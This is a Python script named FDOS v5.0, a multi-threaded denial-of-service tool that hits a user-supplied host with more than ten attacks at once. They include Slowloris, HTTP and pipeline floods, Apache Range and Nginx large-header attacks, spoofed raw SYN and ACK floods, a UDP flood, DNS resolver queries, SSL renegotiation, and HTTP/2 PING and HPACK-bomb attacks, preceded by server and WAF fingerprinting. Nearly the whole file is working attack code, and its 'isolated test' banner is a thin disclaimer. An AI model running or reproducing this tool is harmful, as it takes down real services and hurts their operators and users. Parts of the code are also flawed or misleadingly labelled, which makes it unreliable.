#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import socket
import ssl
import time
import sys
import threading
import random
import struct
import hashlib
import base64
import urllib.parse
import http.client
import re
import json
from typing import Dict, List, Optional, Tuple


RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

def print_color(text: str, color: str = WHITE, bold: bool = False):
    if bold:
        print(f"{BOLD}{color}{text}{RESET}")
    else:
        print(f"{color}{text}{RESET}")

# dont change noob
def print_banner():
    banner = f"""
{RED}{BOLD}  ╔══════════════════════════════════════════════════════════════╗
  ║{BLUE}   ███████╗██████╗  ██████╗ ███████╗                          ║
  ║{BLUE}   ██╔════╝██╔══██╗██╔═══██╗██╔════╝                          ║
  ║{BLUE}   █████╗  ██║  ██║██║   ██║███████╗                          ║
  ║{BLUE}   ██╔══╝  ██║  ██║██║   ██║╚════██║                          ║
  ║{BLUE}   ██║     ██████╔╝╚██████╔╝███████║                          ║
  ║{BLUE}   ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝                          ║
  ║                                                              ║
  ║{GREEN}         ╔═══════════════════════════════════════════════╗    ║
  ║{GREEN}         ║  {RED}MULTI-VECTOR ETERNAL ATTACK {GREEN}                 ║    ║
  ║{GREEN}         ║  {CYAN}10+ Attack Methods Simultaneously  {GREEN}          ║    ║
  ║         ║  {MAGENTA}Created by:{CYAN}Agravix{RESET}                           ║    ║
  ║{GREEN}         ╚═══════════════════════════════════════════════╝    ║
  ║                                                              ║
  ║{DIM}                   [ ONLY FOR ISOLATED TEST ]                 ║
  ╚══════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)


TARGET = ""
PORT = 443
USE_TLS = True
STOP_FLAG = False
THREADS_LIST = []

def random_ip() -> str:
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def random_port() -> int:
    return random.randint(1024, 65535)

def random_ua() -> str:
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
    ]
    return random.choice(agents)

def random_path() -> str:
    paths = [
        '/', '/index.html', '/index.php', '/wp-admin/', '/wp-login.php',
        '/api/v1/users', '/api/v1/products', '/api/v2/orders',
        '/admin/', '/login', '/signup', '/dashboard',
        '/assets/js/main.js', '/assets/css/style.css',
        '/images/logo.png', '/images/banner.jpg',
        '/blog/', '/blog/post/1', '/blog/post/2',
        '/products/', '/products/1', '/products/2',
        '/search?q=' + str(random.randint(1, 999999)),
        '/category/' + str(random.randint(1, 100)),
        '/tag/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
    ]
    return random.choice(paths)

def random_headers() -> Dict:
    return {
        'User-Agent': random_ua(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'fa-IR,fa;q=0.9', 'ar-SA,ar;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate', 'identity']),
        'Connection': random.choice(['keep-alive', 'close']),
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'public']),
        'DNT': random.choice(['1', '0']),
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': random_ip(),
        'X-Real-IP': random_ip(),
        'X-Originating-IP': random_ip(),
        'Referer': f"http://{TARGET}/" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz/', k=random.randint(5, 15))),
    }


def detect_server(target: str, port: int) -> Dict:
    result = {
        'type': 'unknown',
        'version': 'unknown',
        'protocols': ['http1.1'],
        'tls': None,
        'waf': None,
        'os': 'unknown'
    }
    
    try:
        conn = http.client.HTTPConnection(target, port, timeout=5)
        conn.request('HEAD', '/', headers={'User-Agent': 'Mozilla/5.0'})
        resp = conn.getresponse()
        server_header = resp.getheader('Server', '')
        
        if 'nginx' in server_header.lower():
            result['type'] = 'nginx'
            v = re.search(r'nginx/([\d.]+)', server_header)
            if v: result['version'] = v.group(1)
        elif 'apache' in server_header.lower():
            result['type'] = 'apache'
            v = re.search(r'Apache/([\d.]+)', server_header)
            if v: result['version'] = v.group(1)
        elif 'iis' in server_header.lower():
            result['type'] = 'iis'
            v = re.search(r'Microsoft-IIS/([\d.]+)', server_header)
            if v: result['version'] = v.group(1)
        elif 'cloudflare' in server_header.lower():
            result['waf'] = 'cloudflare'
        elif 'sucuri' in server_header.lower():
            result['waf'] = 'sucuri'
        elif 'aws' in server_header.lower() or 'amazon' in server_header.lower():
            result['waf'] = 'AWS'
        conn.close()
    except:
        pass
    
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target, port))
        ssl_sock = context.wrap_socket(sock, server_hostname=target)
        result['tls'] = ssl_sock.version()
        cert = ssl_sock.getpeercert()
        if cert and 'subject' in cert:
            for sub in cert['subject']:
                if isinstance(sub, tuple):
                    for item in sub:
                        if item[0] == 'organizationName':
                            result['os'] = item[1]
        ssl_sock.close()
    except:
        pass
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target, port))
        req = b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\nConnection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAQAAAAIAAAAA\r\n\r\n"
        sock.send(req)
        resp = sock.recv(1024)
        if b'101 Switching' in resp or b'Upgrade' in resp or b'h2' in resp:
            result['protocols'].append('http2')
        sock.close()
    except:
        pass
    
    return result

def attack_slowloris():
    print_color("[ATTACK] Slowloris started", GREEN)
    sockets = []
    
    while not STOP_FLAG:
        for _ in range(30):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                if USE_TLS:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=TARGET)
                sock.connect((TARGET, PORT))
                sock.send(f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n".encode())
                sockets.append(sock)
            except:
                pass
        
        time.sleep(1)
        
        for sock in sockets[:]:
            try:
                sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,999999)}\r\n".encode())
            except:
                try:
                    sock.close()
                except:
                    pass
                sockets.remove(sock)
        
        time.sleep(10)
        for sock in sockets[:]:
            try:
                sock.send(f"X-keep: {int(time.time())}\r\n".encode())
            except:
                try:
                    sock.close()
                except:
                    pass
                sockets.remove(sock)


def attack_http_flood():
    print_color("[ATTACK] HTTP Flood started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            
            path = random_path()
            headers = random_headers()
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {TARGET}\r\n"
            for k, v in headers.items():
                request += f"{k}: {v}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            try:
                sock.recv(1024)
            except:
                pass
            
            sock.close()
            time.sleep(random.uniform(0.001, 0.01))
            
        except:
            pass


def attack_http2_bomb():
    print_color("[ATTACK] HTTP/2 Bomb started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.set_alpn_protocols(['h2'])
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            sock.settimeout(30)
            
            sock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            time.sleep(0.1)
            
            settings = bytes([
                0x00, 0x00, 0x0c, 0x04, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x04, 0x00, 0x00, 0x00, 0x00
            ])
            sock.send(settings)
            time.sleep(0.1)
            
            stream_id = 1
            refs = 100000
            
            headers = bytearray(b'\x00\x00\x00\x01\x04')
            stream_bytes = [
                (stream_id >> 24) & 0xFF,
                (stream_id >> 16) & 0xFF,
                (stream_id >> 8) & 0xFF,
                stream_id & 0xFF
            ]
            headers.extend(stream_bytes)
            
            hpack = b'\x40\x61\x00' + (b'\x81' * refs)
            
            h_len = len(hpack)
            headers[0:3] = bytes([
                (h_len >> 16) & 0xFF,
                (h_len >> 8) & 0xFF,
                h_len & 0xFF
            ])
            
            data = bytes([
                0x00, 0x00, 0x00, 0x00, 0x01,
                stream_bytes[0], stream_bytes[1], stream_bytes[2], stream_bytes[3]
            ])
            
            sock.send(bytes(headers) + hpack + data)
            
            for _ in range(720):  
                if STOP_FLAG:
                    break
                time.sleep(5)
                window = bytes([
                    0x00, 0x00, 0x04, 0x08, 0x00,
                    0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x01
                ])
                sock.send(window)
            
            sock.close()
            
        except:
            pass


def attack_apache_killer():
    print_color("[ATTACK] Apache Killer started", GREEN)
    
    ranges = []
    for i in range(0, 10000, 1):
        ranges.append(f"{i}-{i+1}")
    
    range_header = f"bytes=0-0, {','.join(ranges[:2000])}"
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            sock.settimeout(5)
            
            request = f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nRange: {range_header}\r\nConnection: close\r\n\r\n"
            sock.send(request.encode())
            
            try:
                sock.recv(8192)
            except:
                pass
            
            sock.close()
            time.sleep(0.01)
            
        except:
            pass


def attack_nginx_killer():
    print_color("[ATTACK] Nginx Killer started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            sock.settimeout(5)
            
            big_header = "X-Big: " + "A" * 8192 + "\r\n"
            host_header = f"Host: {TARGET}\r\n"
            
            request = f"GET / HTTP/1.1\r\n{host_header}{big_header * 10}\r\n"
            sock.send(request.encode())
            
            try:
                sock.recv(8192)
            except:
                pass
            
            sock.close()
            time.sleep(0.01)
            
        except:
            pass


def attack_http_pipeline():
    print_color("[ATTACK] HTTP Pipeline started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            sock.settimeout(5)
            
            pipeline = ""
            for _ in range(100):
                path = random_path()
                headers = random_headers()
                request = f"GET {path} HTTP/1.1\r\nHost: {TARGET}\r\n"
                for k, v in headers.items():
                    request += f"{k}: {v}\r\n"
                request += "\r\n"
                pipeline += request
            
            sock.send(pipeline.encode())
            
            try:
                sock.recv(8192)
            except:
                pass
            
            sock.close()
            time.sleep(0.001)
            
        except:
            pass

def attack_syn_flood():
    print_color("[ATTACK] SYN Flood started (requires root)", YELLOW)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.settimeout(1)
    except PermissionError:
        print_color("[!] SYN Flood requires root privileges. Skipping...", RED)
        return
    except:
        return
    
    while not STOP_FLAG:
        try:
            src_ip = random_ip()
            src_port = random_port()
            seq = random.randint(0, 0xFFFFFFFF)
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                0x45, 0x00, 40, 0x0000, 0x0000,
                64, 6, 0x0000,
                socket.inet_aton(src_ip),
                socket.inet_aton(TARGET)
            )
            
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, PORT,
                seq, 0x00000000,
                0x50, 0x02,
                0xFFFF, 0x0000, 0x0000
            )
            
            sock.sendto(ip_header + tcp_header, (TARGET, 0))
            time.sleep(0.0001)
            
        except:
            pass


def attack_ack_flood():
    print_color("[ATTACK] ACK Flood started (requires root)", YELLOW)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.settimeout(1)
    except PermissionError:
        print_color("[!] ACK Flood requires root privileges. Skipping...", RED)
        return
    except:
        return
    
    while not STOP_FLAG:
        try:
            src_ip = random_ip()
            src_port = random_port()
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                0x45, 0x00, 40, 0x0000, 0x0000,
                64, 6, 0x0000,
                socket.inet_aton(src_ip),
                socket.inet_aton(TARGET)
            )
            
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, PORT,
                0x00000000, 0x00000000,
                0x50, 0x10,  # ACK flag
                0xFFFF, 0x0000, 0x0000
            )
            
            sock.sendto(ip_header + tcp_header, (TARGET, 0))
            time.sleep(0.0001)
            
        except:
            pass


def attack_udp_flood():
    print_color("[ATTACK] UDP Flood started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            dest_port = random.randint(1, 65535)
            payload = random.randbytes(random.randint(64, 4096))
            
            sock.sendto(payload, (TARGET, dest_port))
            sock.close()
            time.sleep(0.0001)
            
        except:
            pass


def attack_dns_amplification():
    print_color("[ATTACK] DNS Amplification started (requires open DNS resolver)", YELLOW)
    
    dns_servers = [
        '8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9',
        '208.67.222.222', '208.67.220.220'
    ]
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            dns_query = bytes([
                0x00, 0x01,
                0x01, 0x00,
                0x00, 0x01,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x03, ord('w'), ord('w'), ord('w'),
                0x06, ord('g'), ord('o'), ord('o'), ord('g'), ord('l'), ord('e'),
                0x03, ord('c'), ord('o'), ord('m'),
                0x00,
                0x00, 0x01,
                0x00, 0x01,
            ])
            
            sock.sendto(dns_query, (random.choice(dns_servers), 53))
            sock.close()
            time.sleep(0.001)
            
        except:
            pass



def attack_ssl_renegotiation():
    print_color("[ATTACK] SSL Renegotiation started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=TARGET)
            
            ssl_sock.connect((TARGET, PORT))
            
            for _ in range(50):
                try:
                    ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\n\r\n")
                    ssl_sock.recv(1024)
                    ssl_sock.do_handshake()
                except:
                    break
            
            ssl_sock.close()
            time.sleep(0.01)
            
        except:
            pass


def attack_http2_ping_flood():
    print_color("[ATTACK] HTTP/2 PING Flood started", GREEN)
    
    while not STOP_FLAG:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.set_alpn_protocols(['h2'])
                sock = context.wrap_socket(sock, server_hostname=TARGET)
            sock.connect((TARGET, PORT))
            sock.settimeout(5)
            
            sock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            time.sleep(0.1)
            
            settings = bytes([0x00, 0x00, 0x0c, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00])
            sock.send(settings)
            time.sleep(0.1)
            
            for _ in range(100):
                if STOP_FLAG:
                    break
                ping = bytes([
                    0x00, 0x00, 0x08, 0x06, 0x00,
                    0x00, 0x00, 0x00, 0x00,
                ]) + random.randbytes(8)
                sock.send(ping)
                time.sleep(0.001)
            
            sock.close()
            
        except:
            pass


def print_status():
    while not STOP_FLAG:
        time.sleep(10)
        print_color(f"[STATUS] {threading.active_count()} active threads", CYAN)

def main():
    global TARGET, PORT, USE_TLS, STOP_FLAG
    
    print_banner()
    

    if len(sys.argv) >= 3:
        TARGET = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        print_color("\n[?] No arguments provided.", YELLOW)
        TARGET = input_color("Enter target IP or domain: ", CYAN)
        PORT = int(input_color("Enter target port (default 443): ", CYAN) or "443")
    
    USE_TLS = PORT != 80
    
    print_color("\n" + "="*70, MAGENTA)
    print_color(f"  FDOS v5.0 - Eternal Multi-Vector Attack", BOLD + RED)
    print_color(f"  Target: {TARGET}:{PORT}", CYAN)
    print_color(f"  TLS: {USE_TLS}", CYAN)
    print_color("="*70, MAGENTA)
    
    print_color("\n[SCAN] Detecting server...", BLUE)
    info = detect_server(TARGET, PORT)
    print_color(f"[+] Type: {info['type']} {info['version']}", GREEN)
    print_color(f"[+] Protocols: {', '.join(info['protocols'])}", GREEN)
    print_color(f"[+] TLS: {info['tls']}", GREEN)
    if info.get('waf'):
        print_color(f"[+] WAF: {info['waf']}", YELLOW)
    
    print_color("\n[START] Launching 10 attack methods...\n", RED + BOLD)
    
    attacks = [
        attack_slowloris,
        attack_http_flood,
        attack_http_pipeline,
        attack_apache_killer,
        attack_nginx_killer,
        attack_syn_flood,
        attack_ack_flood,
        attack_udp_flood,
        attack_dns_amplification,
        attack_ssl_renegotiation,
        attack_http2_ping_flood,
    ]
    
    if 'http2' in info['protocols']:
        attacks.append(attack_http2_bomb)
    
    for attack_func in attacks:
        t = threading.Thread(target=attack_func, daemon=False)
        t.start()
        THREADS_LIST.append(t)
        time.sleep(0.2)
    
    status_thread = threading.Thread(target=print_status, daemon=False)
    status_thread.start()
    THREADS_LIST.append(status_thread)
    
    print_color(f"\n[+] {len(THREADS_LIST)} attack threads running FOREVER!", GREEN + BOLD)
    print_color("[+] Press Ctrl+C to stop all attacks.\n", YELLOW)
    print_color("="*70 + "\n", MAGENTA)
    
    try:
        for t in THREADS_LIST:
            t.join()
    except KeyboardInterrupt:
        STOP_FLAG = True
        print_color("\n[STOP] Stopping all attacks...", RED)
        time.sleep(2)
        print_color("[OK] Done.\n", GREEN)
        sys.exit(0)

def input_color(prompt: str, color: str = WHITE) -> str:

    print(f"{color}{prompt}{RESET}", end='')
    return input()

if __name__ == "__main__":
    main()
